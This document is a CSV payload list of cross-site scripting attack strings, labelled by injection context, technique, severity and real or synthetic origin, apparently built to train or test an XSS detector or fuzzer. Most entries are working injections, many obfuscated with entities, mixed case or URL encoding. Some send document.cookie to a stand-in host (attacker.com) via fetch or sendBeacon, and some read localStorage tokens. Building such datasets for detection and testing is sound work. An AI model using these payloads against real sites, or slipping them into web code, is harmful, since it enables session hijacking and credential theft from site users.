payload,context,technique,severity,length,source
"<ifr&#97;m&#101; ontouchst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) ontouchst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,145,synthetic
"\' OncHanGe=ConFirM(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,52,synthetic
<bdi onpointerdown=alert(1) style=display:block>AnonKryptiQuz</bdi>,tag_injection,none,medium,67,real
"<div draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</div>",tag_injection,none,medium,62,real
"__pRotO__[""oNtrAnsItiOnrUn""]=cOnfIrm(loCalStoRagE.gEtITem('tOkeN'))",dom_sink,synthetic,high,67,synthetic
"<dd oncontextmenu=""alert(1)"">AnonKryptiQuz</dd>",tag_injection,none,medium,47,real
"<style>:target {color: red;}</style><map id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></map>",tag_injection,none,medium,109,real
"<style>:target {color: red;}</style><sup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></sup>",tag_injection,none,medium,109,real
' ><svg onmousewheel=\u0061lert(location.hash)>,attribute_escape,synthetic,low,47,synthetic
<option onfocusout=alert(1) tabindex=1 id=x></option><input autofocus>,tag_injection,none,medium,70,real
"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",tag_injection,none,medium,115,real
	onCloSe=ConSolE.lOg('XSS'),event_handler,synthetic,medium,27,synthetic
<emBed x=Y oNmoZfuLlsCreEncHanGe=ConFirM(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,56,synthetic
ontransitionrun=confirm/**/(1),event_handler,synthetic,low,30,synthetic
OnaUxcLicK=jAvaScrIpt:coNsoLe.Log('XSS'),event_handler,synthetic,medium,40,synthetic
\' OnbEfoRemAtcH=cOnfIrm(loCatIon.haSh)//,attribute_escape,synthetic,medium,41,synthetic
%22><img src=x onclick=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,41,synthetic
"\"" OnpLay=coNfiRm(DocUmeNt.DomAin)//",attribute_escape,synthetic,medium,36,synthetic
"<progress onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",tag_injection,none,medium,76,real
'><Img srC=x onPauSe=ConFirM(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,46,synthetic
<em id=x tabindex=1 onactivate=alert(1)></em>,tag_injection,none,medium,45,real
'><Img srC=x onMouSewHeeL=cOnsOle.loG(1)>,attribute_escape,synthetic,medium,41,synthetic
"<code onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></code>",tag_injection,none,medium,281,real
"<style>:target {color: red;}</style><font id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></font>",tag_injection,none,medium,111,real
""" oNpoIntErcAncEl=ProMpt(1) """,attribute_escape,synthetic,medium,29,synthetic
onerror=javascript:console.log(location.hash),event_handler,synthetic,medium,45,synthetic
"""{text:<img/src=x onload=confirm(1)>}""",tag_injection,none,medium,38,real
""" ><svg on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,low,61,synthetic
"""><img src=x onbeforeinput=console.log('XSS')>",attribute_escape,synthetic,medium,46,synthetic
"""><TabLe OntOucHenD=pRomPt(DocUmeNt.DomAin)>",tag_injection,synthetic,medium,44,synthetic
%3Cset x=y oncanplay=confirm(1)%3E,tag_injection,synthetic,medium,34,synthetic
"<viDeo
onPasTe=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,52,synthetic
"<a onclick=""alert(1)"" style=display:block>AnonKryptiQuz</a>",tag_injection,none,medium,59,real
onfocusin=javascript:confirm(document.domain),event_handler,synthetic,medium,45,synthetic
<p onpointerdown=alert(1) style=display:block>AnonKryptiQuz</p>,tag_injection,none,medium,63,real
<dialog onpagehide=console.log(1)>,tag_injection,synthetic,medium,34,synthetic
OnbEfoRecOpy=alErt/**/(dOcuMenT.dOmaIn),event_handler,synthetic,low,39,synthetic
' ><svG oNtrAnsItiOneNd=ProMpt(loCatIon.haSh)>,attribute_escape,synthetic,medium,46,synthetic
<head onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,66,real
"<embed onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",tag_injection,none,medium,72,real
""" onreset=console.log('XSS') """,attribute_escape,synthetic,medium,30,synthetic
"<thead onmousemove=""alert(1)"">AnonKryptiQuz</thead>",tag_injection,none,medium,51,real
%3Ca	onkeypress=confirm(1)%3E,tag_injection,synthetic,medium,29,synthetic
<object src=x onvolumechange=\u0061lert(1)>,tag_injection,synthetic,low,43,synthetic
<body onmessage=alert(1)>,tag_injection,none,medium,25,real
&quot; ontoggl&#101;=consol&#101;.log('XSS') x=&quot;,attribute_escape,synthetic,low,53,synthetic
' onr&#101;p&#101;&#97;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,low,64,synthetic
"%3Cspan
onbeforetoggle=prompt(location.hash)%3E",tag_injection,synthetic,medium,47,synthetic
'%3E%3Cimg src=x onload=console.log(1)%3E,attribute_escape,synthetic,medium,41,synthetic
<base onpointerup=alert(location.hash)/>,tag_injection,synthetic,medium,40,synthetic
%22><table onselect=prompt(1)>,tag_injection,synthetic,medium,30,synthetic
"\"" OndBlcLicK=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,58,synthetic
"""><h1><IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"">123</h1>",js_uri,none,medium,64,real
"""><iframe src=""javascript:alert(AnonKryptiQuz)"">",js_uri,none,medium,48,real
<foRm/OnwEbkIttRanSitIonEnd=prOmpT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,50,synthetic
'><img src=x onkeypress=\u0061lert(1)>,attribute_escape,synthetic,low,38,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onmous&#101;ov&#101;r"":&#97;l&#101;rt})",dom_sink,synthetic,low,71,synthetic
${alert(1)|n},template_injection,synthetic,medium,13,synthetic
"onb&#101;for&#101;copy=&#97;l&#101;rt&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler,synthetic,low,85,synthetic
"__proto__[""onmous&#101;ov&#101;r""]=XMLHttpR&#101;qu&#101;st('XSS')",dom_sink,synthetic,high,66,synthetic
"OniNpuT=aLerT(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,44,synthetic
'%3E%3Cimg src=x onbeforecut=console.log(1)%3E,attribute_escape,synthetic,medium,46,synthetic
<&#97;udio x=y onpl&#97;y=consol&#101;.log(1)>,tag_injection,synthetic,low,46,synthetic
`%3E%3Cimg src=x onpromptaction=console.log('XSS')%3E,attribute_escape,synthetic,medium,53,synthetic
onpoint&#101;rc&#97;nc&#101;l=prompt/**/(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,63,synthetic
<small onpointermove=alert(1) style=display:block>AnonKryptiQuz</small>,tag_injection,none,medium,71,real
"	onvolumechange=\u0061lert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,57,synthetic
location=%22javascript:fetch(%27//attacker.com/?c=%27+document.cookie)%22,dom_sink,synthetic,high,73,synthetic
<viDeo/onMozFulLscReeNchAngE=pRomPt('XSS')>,tag_injection,synthetic,medium,43,synthetic
"<content ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</content>",tag_injection,none,medium,95,real
<marquee onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
"<a href=""\xE2\x80\xAFjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,79,real
"<xmp x=y ontouchend=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,63,synthetic
<figcaption contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,64,real
%3Cmath onscrollend=prompt(document.domain)/%3E,tag_injection,synthetic,medium,47,synthetic
"""><&#97;nim&#97;t&#101;motion on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log('XSS')>",tag_injection,synthetic,low,92,synthetic
&quOt; onPagEhiDe=ConFirM(1) x=&qUot;,attribute_escape,synthetic,medium,37,synthetic
""" ><svg onpaste=confirm('XSS')>",attribute_escape,synthetic,medium,31,synthetic
%3C!--%3E%3Canimate onfocus=console.log(document.domain)%3E,tag_injection,synthetic,medium,59,synthetic
<svg><shadow onload=alert(1)></shadow>,tag_injection,none,medium,38,real
""" oNcuT=cOnfIrm(1) """,attribute_escape,synthetic,medium,20,synthetic
ondragenter=javascr	ipt:prompt(document.domain),event_handler,synthetic,medium,47,synthetic
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=&lt;SCRIPT&gt;alert('AnonKryptiQuz')&lt;/SCRIPT&gt;"">",tag_injection,case_variation,medium,99,real
%22 onhashchange=console.log(document.domain) %22,attribute_escape,synthetic,medium,49,synthetic
</TITLE><SCRIPT>alert(2005);</SCRIPT>,script_injection,case_variation,medium,37,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><big id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></big>",tag_injection,none,medium,176,real
%3Ciframe oninput=console.log(location.hash)/%3E,tag_injection,synthetic,medium,48,synthetic
' ><svg onmouseenter=alert(location.hash)>,attribute_escape,synthetic,medium,42,synthetic
"window[""consol&#101;.log""](docum&#101;nt.cooki&#101;)",dom_sink,synthetic,low,53,synthetic
&quot; onpromptdismiss=prompt(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape,synthetic,medium,64,synthetic
""" onp&#97;g&#101;sw&#97;p=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,low,84,synthetic
""" ><svg onpromptdismiss=prompt(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,54,synthetic
"javascript:var a=""ale"";var b=""rt"";var c=""()"";decodeURI(""<button popovertarget=x>Click me</button><hvita onbeforetoggle=""+a+b+c+"" popover id=x>Hvita</hvita>"")",js_uri,none,low,157,real
"<div draggable=""true"" contenteditable>drag me</div><ins ondrop=alert(1) contenteditable style=display:block>drop here</ins>",tag_injection,none,medium,123,real
%27 onreset=alert(%27XSS%27) %27,attribute_escape,synthetic,medium,32,synthetic
"\"" ongotpoint&#101;rc&#97;ptur&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)//",attribute_escape,synthetic,low,81,synthetic
""" onk&#101;ypr&#101;ss=&#97;l&#101;rt(1) """,attribute_escape,synthetic,low,42,synthetic
<button popovertarget=x>Click me</button><cite onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</cite>,tag_injection,none,medium,104,real
"<div draggable=""true"" contenteditable>drag me</div><table ondrop=alert(1) contenteditable style=display:block>drop here</table>",tag_injection,none,medium,127,real
"<main onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</main>",tag_injection,none,medium,65,real
"data:text/html,<scr	ipt>console.log(1)</scr	ipt>",js_uri,synthetic,medium,48,synthetic
%22><img src=x ontransitionend=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,50,synthetic
""" oNpoIntErrAwuPdaTe=AleRt(LocAtiOn.HasH) """,attribute_escape,synthetic,medium,43,synthetic
JAVASCRIPT:pRomPt(1),js_uri,synthetic,medium,20,synthetic
"javascript:/*`/*'/*'/*""-/*\""/**/ alert()//></title></textarea></style></select></script></noembed></noscript></template>--><<svg/onload=alert()><frame/src=javascript:alert()>",js_uri,comment_injection,medium,174,real
""" oNpoIntErdOwn=coNsoLe.Log(doCumEnt.doMaiN) """,attribute_escape,synthetic,medium,46,synthetic
"<marquee onbeforetoggle=alert(String.fromCharCode(88,83,83)) onbeforetoggle=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,113,synthetic
"<script>//console.log(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,high,61,synthetic
"%3Ctemplate onbegin=alert(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,59,synthetic
"window[""&#97;l&#101;rt""](bto&#97;(docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,61,synthetic
<marquee	onauxclick=prompt(location.hash)>,tag_injection,synthetic,medium,42,synthetic
"	ondblclick=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,49,synthetic
"document.body.innerHTML=""<img src=x onerror=fetch(localStorage.getItem('token'))>""",dom_sink,synthetic,high,82,synthetic
%3Ctable onselect=confirm(document.domain) onselect=confirm(document.domain)%3E,tag_injection,synthetic,medium,79,synthetic
<svg src=x onpromptdismiss=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,65,synthetic
<teMplAte	onConTexTmeNu=ConSolE.lOg(1)>,tag_injection,synthetic,medium,39,synthetic
${{\u0061lert(1)}},template_injection,synthetic,low,18,synthetic
onpointermove=console.log/***/(1),event_handler,synthetic,low,33,synthetic
<taBle	onInvAliD=pRomPt('XSS')>,tag_injection,synthetic,medium,31,synthetic
<s&#101;l&#101;ct	ongotpoint&#101;rc&#97;ptur&#101;=confirm(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,86,synthetic
"""%3E%3Cimg src=x ontouchstart=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,69,synthetic
"<style>:target {color: red;}</style><a id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></a>",tag_injection,none,medium,105,real
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""&#101;v&#97;l(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))""",dom_sink,synthetic,low,183,synthetic
"<center onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</center>",tag_injection,none,medium,72,real
onwheel=alert/*x*/(1),event_handler,synthetic,low,21,synthetic
`><img src=x onfullscreenchange=console.log(1)>,attribute_escape,synthetic,medium,47,synthetic
"' ><svG oNtoUchStaRt=AleRt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
<buTtoN sRc=X oNclIck=coNsoLe.Log(1)>,tag_injection,synthetic,medium,37,synthetic
"<figcaption onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",tag_injection,none,medium,81,real
JavAscRipT:pRomPt/***/('XSS'),js_uri,synthetic,low,29,synthetic
"' onlo&#97;d=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,low,69,synthetic
"&quot; onmous&#101;&#101;nt&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape,synthetic,low,100,synthetic
<math onplaying=console.log(%27XSS%27) onplaying=console.log(%27XSS%27)>,tag_injection,synthetic,medium,72,synthetic
%22><img src=x ondragenter=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,46,synthetic
<taBle onTouCheNd=ProMpt(doCumEnt.doMaiN) OntOucHenD=pRomPt(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,77,synthetic
"<spacer onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",tag_injection,none,medium,72,real
"<maRquEe
OnpRomPtdIsmIss=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,68,synthetic
"<hgroup onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></hgroup>",tag_injection,none,medium,285,real
' ><svG oNscRolLsnApcHanGe=ConFirM('XSS')>,attribute_escape,synthetic,medium,42,synthetic
"<script
>console.log(document.domain)</script>",script_injection,synthetic,medium,46,synthetic
"location.href=""javascript:eval('XSS')""",dom_sink,synthetic,high,38,synthetic
"""><img src=x onbeforepaste=\u0061lert(1)>",attribute_escape,synthetic,low,41,synthetic
<xmp x=y ontr&#97;nsition&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,72,synthetic
onpointermove=console.log&#40;document.domain&#41;,event_handler,synthetic,low,50,synthetic
"<applet onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</applet>",tag_injection,none,medium,74,real
<svg onload=(alert)(1) >//INJECTX,tag_injection,none,low,33,real
OnpLay=coNsoLe.Log&#40;1&#41;,event_handler,synthetic,low,29,synthetic
"xss:ex/*AnonKryptiQuz*//*/*/pression(alert(""AnonKryptiQuz""))'>",attribute_escape,comment_injection,medium,62,real
%27 onreset=prompt(location.hash) %27,attribute_escape,synthetic,medium,37,synthetic
	onpl&#97;y=consol&#101;.log(1),event_handler,synthetic,low,31,synthetic
	onpoint&#101;rmov&#101;=consol&#101;.log(1),event_handler,synthetic,low,44,synthetic
<!--><form onr&#101;s&#101;t=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,72,synthetic
"\"" onpagereveal=confirm(document.domain)//",attribute_escape,synthetic,medium,42,synthetic
javascript:prompt/**/('XSS'),js_uri,synthetic,low,28,synthetic
"'%3E%3Cimg src=x onscrollsnapchange=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,76,synthetic
"\"" OnwAitIng=coNfiRm(DocUmeNt.DomAin)//",attribute_escape,synthetic,medium,39,synthetic
"\"" OnaNimAtiOniTerAtiOn=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape,synthetic,high,68,synthetic
`><img src=x onfocusout=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,55,synthetic
""" %3E%3Csvg onbeforecopy=prompt(location.hash)%3E",attribute_escape,synthetic,medium,49,synthetic
"<main onmouseenter=""alert(1)"">AnonKryptiQuz</main>",tag_injection,none,medium,50,real
&quOt; onSeaRch=coNfiRm(1) X=&QuoT;,attribute_escape,synthetic,medium,35,synthetic
"<table onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</table>",tag_injection,none,medium,72,real
'><Img srC=x onWaiTinG=pRomPt(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,47,synthetic
<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>,tag_injection,none,medium,58,real
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>""",dom_sink,synthetic,medium,125,synthetic
"<div	onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,101,synthetic
"<th onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</th>",tag_injection,none,medium,77,real
<math src=x onplaying=console.log('XSS')>,tag_injection,synthetic,medium,41,synthetic
<tbody onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,67,real
"OndBlcLicK=pRomPt(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,48,synthetic
<svg onunload=window.open('javascript:alert(1)')>,dom_sink,none,medium,49,real
"<shadow onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</shadow>",tag_injection,none,medium,87,real
"<xss
onend=prompt(%27XSS%27)>",tag_injection,synthetic,medium,29,synthetic
""" onend=prompt(location.hash) """,attribute_escape,synthetic,medium,31,synthetic
<input type=checkbox id=x onfocus=alert(1)>,tag_injection,none,medium,43,real
"%3Caudio
onplay=console.log(1)%3E",tag_injection,synthetic,medium,33,synthetic
